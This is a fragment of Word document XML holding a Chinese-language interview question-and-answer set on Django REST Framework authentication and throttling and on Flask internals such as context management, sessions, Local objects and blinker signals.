          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架的认证流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C4A3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如何编写？写类并实现authenticators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC7916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请求进来认证需要编写一个类，类里面有一个authenticators方法，我们可以自定义这个方法，可以定制3类返回值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2301F80E" w14:textId="0BB90CEC"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成功返回元组，返回none为匿名用户，抛出异常为认证失败。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D95FB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源码流程：请求进来先走dispatch方法，然后封装的request对象会执行user方法，由user触发authenticators认证流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DCC93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方法中可以定义三种返回值：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3769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 （user,auth），认证成功</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C92F3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None , 匿名用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35263AF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异常 ，认证失败</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B0B6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流程：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144C88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dispatch </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572302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再去request中进行认证处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75164E55" w14:textId="15F0C7B9"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063</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Django Rest Framework</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何实现的用户访问频率控制？</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C80D9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对匿名用户，根据用户IP或代理IP作为标识进行记录，为每个用户在redis中建一个列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBF07E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279E972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throttle_10.1.1.1:[1526868876.497521, 152686885.497521, ...]，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A19D7D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throttle_10.1.1.2:[1526868876.497521, 152686885.497521, ...]，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7AF63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throttle_10.1.1.3:[1526868876.497521, 152686885.497521, ...]，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3443F63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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E49873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每个用户再来访问时，先去记录中剔除过期记录，再根据列表的长度判断是否可以继续访问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D4ACF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'如何封IP'：在防火墙中进行设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFC0F6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12E747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对注册用户，根据用户名或邮箱进行判断。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB82A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2D4CE2B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throttle_xxxx1:[1526868876.497521, 152686885.497521, ...]，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A24D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throttle_xxxx2:[1526868876.497521, 152686885.497521, ...]，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62875BC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throttle_xxxx3:[1526868876.497521, 152686885.497521, ...]，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD94E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14A8DA8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每个用户再来访问时，先去记录中剔除过期记录，再根据列表的长度判断是否可以继续访问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD39D8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如1分钟：40次，列表长度限制在40，超过40则不可访问</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4FC20D" w14:textId="0F035DFF"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064</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框架的优势？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D43D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Flask自由、灵活，可扩展性强，透明可控，第三方库的选择面广。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744523C2" w14:textId="4C38453E"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065</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框架依赖组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B79CD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依赖jinja2模板引擎</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 依赖werkzurg协议</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC4E3C0" w14:textId="0037C5D5"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066</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蓝图的作用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E62171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blueprint把实现不同功能的module分开.也就是把一个大的App分割成各自实现不同功能的module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="741D8F9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在一个blueprint中可以调用另一个blueprint的视图函数, 但要加相应的blueprint名.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1BA9AB" w14:textId="013AF73B"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067</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列举使用的</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第三方组件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1948D5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Flask组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A45649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flask-session　　session放在redis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732F972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flask-SQLAlchemy　　如django里的ORM操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C62E1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flask-migrate　　数据库迁移</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E25B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flask-script　　自定义命令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD3A9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blinker　　信号-触发信号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052C9BB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第三方组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5F52D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Wtforms　　快速创建前端标签、文本校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F8D5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dbutile　　创建数据库连接池</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1F69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gevnet-websocket　　实现websocket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4328870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自定义Flask组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04CFD0D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自定义auth认证 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338B604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参考flask-login组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FA83E1" w14:textId="7715079E"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068</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简述</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上下文管理流程</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A205A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a、简单来说，falsk上下文管理可以分为三个阶段：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C003B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1、'请求进来时'：将请求相关的数据放入上下问管理中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5AEC0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2、'在视图函数中'：要去上下文管理中取值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671DA81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3、'请求响应'：要将上下文管理中的数据清除</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C5D17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b、详细点来说：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B00D58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1、'请求刚进来'：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0BC6F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将request，session封装在RequestContext类中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DE1E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app，g封装在AppContext类中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444C68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并通过LocalStack将requestcontext和appcontext放入Local类中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424D49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2、'视图函数中'：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0F3B2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通过localproxy---&gt;偏函数---&gt;localstack---&gt;local取值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255DE6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3、'请求响应时'：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7285B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先执行save.session()再各自执行pop(),将local中的数据清除</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A80C494" w14:textId="4A914804"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069</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中的</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2902285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g是贯穿于一次请求的全局变量，当请求进来将g和current_app封装为一个APPContext类；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D2BC3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再通过LocalStack将Appcontext放入Local中，取值时通过偏函数在LocalStack、local中取值；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798B7A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响应时将local中的g数据删除；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76EDF983" w14:textId="3EF88E6D"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070</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中上下文管理主要涉及到了那些相关的类？并描述类主要作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228A1F7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RequestContext  #封装进来的请求（赋值给ctx）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E6AC7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AppContext      #封装app_ctx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57742C7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LocalStack      #将local对象中的数据维护成一个栈（先进后出）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EDA06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Local           #保存请求上下文对象和app上下文对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4A7E70" w14:textId="1E68DE1B"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lastRenderedPageBreak/>
        <w:t>071</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为什么要</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把</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Local</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象中的的值</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>stack</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>维护成一个列表？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE14B7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因为通过维护成列表，可以实现一个栈的数据结构，进栈出栈时只取一个数据，巧妙的简化了问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671886E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还有，在多app应用时，可以实现数据隔离；列表里不会加数据，而是会生成一个新的列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FBCC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local是一个字典，字典里key（stack）是唯一标识，value是一个列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D92F91" w14:textId="2DDD4DAC"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072</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中多</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>应用是怎么完成？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27028A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请求进来时，可以根据URL的不同，交给不同的APP处理。蓝图也可以实现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2791764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#app1 = Flask('app01')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1273BD0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#app2 = Flask('app02')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D268F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#@app1.route('/index')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B5A9DF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#@app2.route('/index2')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6BB55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源码中在DispatcherMiddleware类里调用app2.__call__，原理其实就是URL分割，然后将请求分发给指定的app。之后app也按单app的流程走。就是从app.__call__走。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3519DBC6" w14:textId="62FF40E5" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="00670F77"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073</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在</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中实现</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WebSocket</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>需要什么组件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1101E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gevent-websocket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73823BD3" w14:textId="13A064C3"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074</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wtforms</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>组件的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663E101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#快速创建前端标签、文本校验；如django的ModelForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FC986C" w14:textId="7DCC96FC"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075</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框架默认</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>处理机制？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767065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前提:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EF68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不熟的话:记不太清了,应该是……分两个阶段吧   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9648D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创建:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F752B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当请求刚进来的时候,会将request和session封装成一个RequestContext()对象,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D06841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接下来把这个对象通过LocalStack()放入内部的一个Local()对象中;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0539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因为刚开始 Local 的ctx中session是空的;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1978B5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所以,接着执行open_session,将cookie 里面的值拿过来,重新赋值到ctx中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D33F9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(Local实现对数据隔离,类似threading.local) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313AD57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销毁:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391C727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最后返回时执行 save_session() 将ctx 中的session读出来进行序列化,写到cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135F8A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然后给用户,接着把 ctx pop掉</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534D8F72" w14:textId="46CEB0B9"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076</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解释</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框架中的</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Local</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象和</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>threading.local</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6184F62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a.threading.local</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E546E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作用：为每个线程开辟一块空间进行数据存储(数据隔离)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADD35D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问题：自己通过字典创建一个类似于threading.local的东西。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0366C4C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storage = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1898F4E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4740: {val: 0},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF8AC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4732: {val: 1},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F699A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4731: {val: 3},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6372794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9A3AD8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b.自定义Local对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5744DCD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作用：为每个线程(协程)开辟一块空间进行数据存储(数据隔离)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DA46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Local(object):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC148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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F952F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object.__setattr__(self, 'storage', {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F1797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__setattr__(self, k, v):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CCD3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ident = get_ident()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD980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if ident in self.storage:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1A19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self.storage[ident][k] = v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="704D4B7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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60545C1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self.storage[ident] = {k: v}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F5E763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__getattr__(self, k):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E9DFD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ident = get_ident()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783E10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self.storage[ident][k]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001966C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obj = Local()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69894D4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task(arg):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5366FE0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obj.val = arg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="312C3A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obj.xxx = arg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08CBE4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print(obj.val)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111B834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for i in range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67878F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 = Thread(target=task, args=(i,))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569E221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t.start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8E2625" w14:textId="7A80A177"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077</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Flask</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> blinker </w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>是什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675A1A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flask中的信号blinker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C50C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信号主要是让开发者可是在flask请求过程中定制一些行为。或者说flask在列表里面预留了几个空列表，在里面存东西。简言之，信号允许某个'发送者'通知'接收者'有事情发生了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5090200C"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@before_request</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>有返回值，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>blinker</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>没有返回值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442A59E8"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10</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>个信号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C7E230"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request_started = _signals.signal('request-started')  #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求到来前执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3D1B29"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request_finished = _signals.signal('request-finished')   #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求结束后执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5547D7EC"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lastRenderedPageBreak/>
        <w:t>before_render_template = _signals.signal('before-render-template')  #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模板渲染前执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40336561"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template_rendered = _signals.signal('template-rendered')  #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模板渲染后执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC5229E"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got_request_exception = _signals.signal('got-request-exception')  #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求执行出现异常时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCDBBD9"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request_tearing_down = _signals.signal('request-tearing-down')  #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求执行完毕后自动执行（无论成功与否）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAC535D"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appcontext_tearing_down = _signals.signal('appcontext-tearing-down')  #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
